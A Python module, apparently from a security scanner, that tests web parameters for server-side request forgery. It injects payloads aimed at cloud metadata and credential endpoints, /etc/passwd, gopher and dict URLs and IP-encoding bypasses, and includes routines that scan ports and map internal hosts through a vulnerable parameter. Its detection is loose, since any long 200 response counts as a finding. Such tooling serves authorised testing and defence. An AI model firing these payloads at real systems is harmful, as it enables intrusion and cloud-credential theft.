
import asyncio
import re
import socket
from typing import Dict, List, Optional, Any, Set, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from ipaddress import ip_address, ip_network, IPv4Address, IPv6Address
from dataclasses import dataclass

from .base_scanner import BaseScanner, ScanContext, Finding, Severity, Confidence

try:
    import httpx
    HTTPX_AVAILABLE = True
except ImportError:
    HTTPX_AVAILABLE = False
    import aiohttp

import logging

logger = logging.getLogger(__name__)


@dataclass
class SSRFTest:
    """اختبار SSRF"""
    name: str
    payload: str
    target_type: str  # internal, external, localhost
    expected_response: str
    description: str


class SSRFScanner(BaseScanner):
    """
    فاحص ثغرات Server-Side Request Forgery (SSRF)
    
    الميزات:
    - كشف عنوان IP الداخلي
    - كشف المنافذ المفتوحة
    - كشف خدمات AWS Metadata
    - كشف خدمات GCP Metadata
    - اختبار الاتصال بالخوادم الداخلية
    - تقنيات تجاوز القيود
    """
    
    # بايلودات اختبار SSRF
    TEST_PAYLOADS = [
        # Localhost tests
        SSRFTest("Localhost IPv4", "http://127.0.0.1:80", "localhost", "Connection", "Basic localhost test"),
        SSRFTest("Localhost IPv6", "http://[::1]:80", "localhost", "Connection", "IPv6 localhost test"),
        SSRFTest("Localhost DNS", "http://localhost:80", "localhost", "Connection", "DNS localhost test"),
        
        # Internal IP tests
        SSRFTest("Internal 10.x.x.x", "http://10.0.0.1:80", "internal", "Connection", "RFC 1918 range 10.0.0.0/8"),
        SSRFTest("Internal 172.16.x.x", "http://172.16.0.1:80", "internal", "Connection", "RFC 1918 range 172.16.0.0/12"),
        SSRFTest("Internal 192.168.x.x", "http://192.168.0.1:80", "internal", "Connection", "RFC 1918 range 192.168.0.0/16"),
        
        # Cloud metadata services
        SSRFTest("AWS Metadata", "http://169.254.169.254/latest/meta-data/", "cloud", "200", "AWS EC2 metadata service"),
        SSRFTest("AWS Metadata v2", "http://169.254.169.254/latest/user-data/", "cloud", "200", "AWS user data"),
        SSRFTest("GCP Metadata", "http://metadata.google.internal/computeMetadata/v1/", "cloud", "200", "GCP metadata service"),
        SSRFTest("Azure Metadata", "http://169.254.169.254/metadata/instance?api-version=2017-08-01", "cloud", "200", "Azure metadata service"),
        
        # Port scanning tests
        SSRFTest("Port 22 SSH", "http://127.0.0.1:22", "port_scan", "Connection", "SSH port test"),
        SSRFTest("Port 3306 MySQL", "http://127.0.0.1:3306", "port_scan", "Connection", "MySQL port test"),
        SSRFTest("Port 5432 PostgreSQL", "http://127.0.0.1:5432", "port_scan", "Connection", "PostgreSQL port test"),
        SSRFTest("Port 6379 Redis", "http://127.0.0.1:6379", "port_scan", "Connection", "Redis port test"),
        SSRFTest("Port 9200 Elasticsearch", "http://127.0.0.1:9200", "port_scan", "Connection", "Elasticsearch port test"),
        
        # Protocol tests
        SSRFTest("File Protocol", "file:///etc/passwd", "file", "Content", "File protocol access"),
        SSRFTest("Dict Protocol", "dict://127.0.0.1:11211/stat", "protocol", "Connection", "Dict protocol"),
        SSRFTest("Gopher Protocol", "gopher://127.0.0.1:8080/_GET%20/ HTTP/1.0%0A%0A", "protocol", "Connection", "Gopher protocol"),
        
        # Bypass techniques
        SSRFTest("Decimal IP", "http://2130706433/", "bypass", "Connection", "Decimal IP representation"),
        SSRFTest("Octal IP", "http://0177.0.0.1/", "bypass", "Connection", "Octal IP representation"),
        SSRFTest("Hex IP", "http://0x7f000001/", "bypass", "Connection", "Hexadecimal IP representation"),
        SSRFTest("Redirect Bypass", "http://redirect-to-localhost.com", "bypass", "Connection", "Redirect-based bypass"),
        SSRFTest("DNS Rebinding", "http://1.2.3.4.nip.io", "bypass", "Connection", "DNS rebinding technique"),
    ]
    
    # إشارات نجاح SSRF
    SUCCESS_INDICATORS = {
        "aws": [r"ami-id", r"instance-id", r"public-keys", r"security-credentials", r"iam/"],
        "gcp": [r"project", r"instance", r"service-accounts", r"k8s", r"cluster"],
        "azure": [r"compute", r"network", r"resourceId", r"subscriptionId"],
        "internal": [r"root:", r"daemon:", r"bin:", r"localhost", r"127.0.0.1"],
        "file": [r"root:", r"daemon:", r"bin:", r"nobody:", r"ssh", r"passwd"],
    }
    
    # نطاقات IP الداخلية
    PRIVATE_IP_RANGES = [
        ip_network("10.0.0.0/8"),
        ip_network("172.16.0.0/12"),
        ip_network("192.168.0.0/16"),
        ip_network("127.0.0.0/8"),
        ip_network("169.254.0.0/16"),
        ip_network("::1/128"),
        ip_network("fc00::/7"),
        ip_network("fe80::/10"),
    ]
    
    def __init__(
        self,
        rate_limit: float = 1.0,
        timeout: int = 30,
        max_retries: int = 2,
        test_ports: List[int] = None,
        detect_cloud_metadata: bool = True,
        test_file_access: bool = True
    ):
        super().__init__(
            name="SSRFScanner",
            rate_limit=rate_limit,
            timeout=timeout,
            max_retries=max_retries
        )
        self._test_ports = test_ports or [22, 80, 443, 3306, 5432, 6379, 9200, 11211]
        self._detect_cloud_metadata = detect_cloud_metadata
        self._test_file_access = test_file_access
        self._session = None
        self._tested_params: Set[str] = set()
        self._vulnerable_endpoints: Set[str] = set()
    
    async def _get_session(self):
        """الحصول على جلسة HTTP"""
        if not self._session:
            if HTTPX_AVAILABLE:
                self._session = httpx.AsyncClient(
                    timeout=self.timeout,
                    follow_redirects=False,  # لا نتبع الـ redirects للتحقق من الـ SSRF
                    verify=False
                )
            else:
                self._session = aiohttp.ClientSession()
        return self._session
    
    async def can_scan(self, context: ScanContext) -> bool:
        """التحقق من وجود معاملات URL أو معاملات تشير إلى URLs"""
        url = context.target.url
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # البحث عن معاملات تحتوي على URLs
        url_pattern = re.compile(r'https?://|ftp://|file://', re.I)
        
        for values in params.values():
            for value in values:
                if url_pattern.search(value):
                    return True
        
        # معاملات POST
        if context.target.data:
            for value in context.target.data.values():
                if url_pattern.search(value):
                    return True
        
        return False
    
    async def scan(self, context: ScanContext) -> List[Finding]:
        """تنفيذ فحص SSRF"""
        findings = []
        url = context.target.url
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # دمج معاملات GET
        all_params = {}
        for key, values in params.items():
            all_params[key] = values[0] if values else ""
        all_params.update(context.target.params)
        
        # معاملات POST
        post_params = context.target.data.copy() if context.target.data else {}
        
        # اختبار كل معامل
        for param_name, param_value in all_params.items():
            if param_name in self._tested_params:
                continue
            
            # اختبار بايلودات SSRF
            for test in self.TEST_PAYLOADS:
                # تخطي اختبارات المنافذ إذا لم نطلبها
                if test.target_type == "port_scan" and not self._test_ports:
                    continue
                
                # تخطي اختبارات الملفات إذا لم نطلبها
                if test.target_type == "file" and not self._test_file_access:
                    continue
                
                # اختبار الحمولة
                finding = await self._test_ssrf_payload(
                    context=context,
                    param_name=param_name,
                    original_value=param_value,
                    payload=test,
                    method="GET",
                    post_params=post_params
                )
                
                if finding:
                    findings.append(finding)
                    self._tested_params.add(param_name)
                    self._vulnerable_endpoints.add(url)
                    break
            
            if param_name in self._tested_params:
                continue
        
        # اختبار معاملات POST
        for param_name, param_value in post_params.items():
            if f"POST:{param_name}" in self._tested_params:
                continue
            
            for test in self.TEST_PAYLOADS:
                finding = await self._test_ssrf_payload(
                    context=context,
                    param_name=param_name,
                    original_value=param_value,
                    payload=test,
                    method="POST",
                    post_params=post_params
                )
                
                if finding:
                    findings.append(finding)
                    self._tested_params.add(f"POST:{param_name}")
                    break
        
        return findings
    
    async def _test_ssrf_payload(
        self,
        context: ScanContext,
        param_name: str,
        original_value: str,
        payload: SSRFTest,
        method: str,
        post_params: Dict[str, str]
    ) -> Optional[Finding]:
        """اختبار حمولة SSRF واحدة"""
        session = await self._get_session()
        url = context.target.url
        
        # بناء الطلب مع الحمولة
        parsed = urlparse(url)
        
        if method == "GET":
            # تعديل معامل GET
            params = parse_qs(parsed.query)
            params[param_name] = [payload.payload]
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            
            try:
                if HTTPX_AVAILABLE:
                    response = await session.get(test_url, headers=context.target.headers)
                    status_code = response.status_code
                    body = response.text
                else:
                    async with session.get(test_url, headers=context.target.headers) as resp:
                        status_code = resp.status
                        body = await resp.text()
                
                # تحليل الرد
                is_vulnerable, evidence = self._analyze_response(body, status_code, payload)
                
                if is_vulnerable:
                    severity = Severity.CRITICAL if payload.target_type in ["cloud", "internal"] else Severity.HIGH
                    
                    finding = self.add_finding(
                        vulnerability_type="Server-Side Request Forgery (SSRF)",
                        severity=severity,
                        confidence=Confidence.HIGH,
                        url=test_url,
                        parameter=param_name,
                        payload=payload.payload,
                        evidence=evidence,
                        description=f"SSRF vulnerability discovered using {payload.name} payload. Server made request to {payload.payload}",
                        remediation="Implement allowlist of allowed URLs. Validate and sanitize user-supplied URLs. Use URL parsers to prevent bypasses. Do not forward raw responses to users.",
                        cvss_score=8.6 if payload.target_type in ["cloud", "internal"] else 7.5,
                        metadata={
                            "payload_name": payload.name,
                            "target_type": payload.target_type,
                            "status_code": status_code
                        }
                    )
                    return finding
                    
            except Exception as e:
                logger.debug(f"Error testing SSRF payload {payload.name}: {e}")
        
        else:
            # اختبار POST
            modified_post = post_params.copy()
            modified_post[param_name] = payload.payload
            
            try:
                if HTTPX_AVAILABLE:
                    response = await session.post(url, data=modified_post, headers=context.target.headers)
                    status_code = response.status_code
                    body = response.text
                else:
                    async with session.post(url, data=modified_post, headers=context.target.headers) as resp:
                        status_code = resp.status
                        body = await resp.text()
                
                is_vulnerable, evidence = self._analyze_response(body, status_code, payload)
                
                if is_vulnerable:
                    finding = self.add_finding(
                        vulnerability_type="Server-Side Request Forgery (SSRF)",
                        severity=Severity.CRITICAL if payload.target_type in ["cloud", "internal"] else Severity.HIGH,
                        confidence=Confidence.HIGH,
                        url=url,
                        parameter=param_name,
                        payload=payload.payload,
                        evidence=evidence,
                        description=f"SSRF vulnerability in POST parameter {param_name} using {payload.name}",
                        remediation="Implement allowlist of allowed URLs. Validate and sanitize user-supplied URLs.",
                        cvss_score=8.6,
                        metadata={"payload_name": payload.name, "target_type": payload.target_type}
                    )
                    return finding
                    
            except Exception as e:
                logger.debug(f"Error testing POST SSRF: {e}")
        
        return None
    
    def _analyze_response(self, body: str, status_code: int, test: SSRFTest) -> Tuple[bool, str]:
        """تحليل الاستجابة لاكتشاف SSRF"""
        evidence = []
        
        # فحص حالة النجاح
        if test.target_type == "cloud":
            for service, indicators in self.SUCCESS_INDICATORS.items():
                for indicator in indicators:
                    if indicator in body.lower():
                        evidence.append(f"Cloud metadata indicator found: {indicator}")
                        return True, "; ".join(evidence)
        
        # فحص البيانات الداخلية
        if test.target_type == "internal" or test.target_type == "localhost":
            for indicator in self.SUCCESS_INDICATORS["internal"]:
                if indicator in body.lower():
                    evidence.append(f"Internal data indicator: {indicator}")
                    return True, "; ".join(evidence)
        
        # فحص محتوى الملفات
        if test.target_type == "file":
            for indicator in self.SUCCESS_INDICATORS["file"]:
                if indicator in body.lower():
                    evidence.append(f"File content indicator: {indicator}")
                    return True, "; ".join(evidence)
        
        # فحص اختلاف في الاستجابة (Timing/Difference)
        if status_code == 200 and len(body) > 100:
            return True, f"Request succeeded with status {status_code}, possible SSRF"
        
        return False, ""
    
    async def test_port_scanning(self, context: ScanContext, target_ip: str) -> Dict[int, bool]:
        """
        اختبار مسح المنافذ عبر SSRF
        
        Args:
            context: سياق الفحص
            target_ip: عنوان IP الهدف
        
        Returns:
            قاموس بالمنافذ المفتوحة
        """
        results = {}
        
        for port in self._test_ports:
            test_url = f"http://{target_ip}:{port}"
            test_payload = SSRFTest(
                name=f"Port {port} Test",
                payload=test_url,
                target_type="port_scan",
                expected_response="Connection",
                description=f"Testing port {port}"
            )
            
            # إنشاء سياق اختبار مؤقت
            test_context = ScanContext(
                target=context.target,
                visited_urls=context.visited_urls
            )
            
            # اختبار المنفذ
            start_time = asyncio.get_event_loop().time()
            
            # إرسال الطلب عبر المعامل الأول المتاح
            for param_name in self._tested_params:
                finding = await self._test_ssrf_payload(
                    context=test_context,
                    param_name=param_name,
                    original_value="",
                    payload=test_payload,
                    method="GET",
                    post_params={}
                )
                
                if finding:
                    results[port] = True
                    break
            
            # إذا لم يتم العثور على شيء، استمر
        
        return results
    
    async def detect_internal_network(self, context: ScanContext) -> List[str]:
        """
        اكتشاف الشبكة الداخلية عبر SSRF
        
        Returns:
            قائمة بعناوين IP الداخلية المتاحة
        """
        discovered_ips = []
        
        # اختبار نطاقات IP شائعة
        test_ips = [
            "10.0.0.1", "10.0.0.2", "10.0.0.10",
            "172.16.0.1", "172.16.0.2",
            "192.168.0.1", "192.168.1.1", "192.168.1.100"
        ]
        
        for test_ip in test_ips:
            test_payload = SSRFTest(
                name=f"Internal IP {test_ip}",
                payload=f"http://{test_ip}:80",
                target_type="internal",
                expected_response="Connection",
                description=f"Testing internal IP {test_ip}"
            )
            
            test_context = ScanContext(target=context.target)
            
            for param_name in self._tested_params:
                finding = await self._test_ssrf_payload(
                    context=test_context,
                    param_name=param_name,
                    original_value="",
                    payload=test_payload,
                    method="GET",
                    post_params={}
                )
                
                if finding:
                    discovered_ips.append(test_ip)
                    break
        
        return discovered_ips
    
    def is_private_ip(self, ip_str: str) -> bool:
        """التحقق مما إذا كان IP داخلياً"""
        try:
            ip = ip_address(ip_str)
            for private_range in self.PRIVATE_IP_RANGES:
                if ip in private_range:
                    return True
            return False
        except ValueError:
            return False
    
    async def close(self):
        """إغلاق الجلسة"""
        if self._session:
            if HTTPX_AVAILABLE:
                await self._session.aclose()
            else:
                await self._session.close()
            self._session = None

